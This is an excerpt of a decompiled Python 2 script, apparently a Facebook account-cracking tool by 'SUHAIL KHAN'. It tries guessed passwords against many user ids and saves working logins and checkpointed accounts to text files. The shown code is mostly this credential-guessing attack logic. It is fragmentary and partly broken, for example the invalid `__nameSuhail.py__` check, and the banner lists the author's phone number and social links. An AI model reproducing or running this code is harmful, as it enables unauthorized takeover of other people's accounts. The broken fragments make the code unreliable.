# coding: utf-8
# Decompiled By SUHAIL KHAN
# uncompyle6 version 1.1.2
# Original written By SUHAIL KHAN


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'SUHAIL'
__copyright = 'All rights reserved . Copyright  SUHAIL KHAN'
CorrectUsername = 'SUHAIL'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[0;92m ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  SUHAIL KHAN
\033[1;91m GitHub      :  https://github.com/Suhail786123
\033[1;91m WHATSAPP  : +1 (206) 338-0856
\033[1;91m FACEBOOK  :  www.facebook.com/Suhail.Khan.767
\033[1;91m VERSOIN   :  7.8.6
\033[1;97m--------------------------------------------------
                                                 """
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [SUHAIL_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [SUHAIL_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [SUHAIL_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [SUHAIL_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [SUHAIL_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SUHAIL_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    jalan('Note : Cp account  10 say 12 days BAD OPEN KRE')
    raw_input('\n\x1b[1;97m[\x1b[1;98mSUHAIL_menu_Back\x1b[1;95m]')
    login()


if __nameSuhail.py__ == '__main__':
    menu()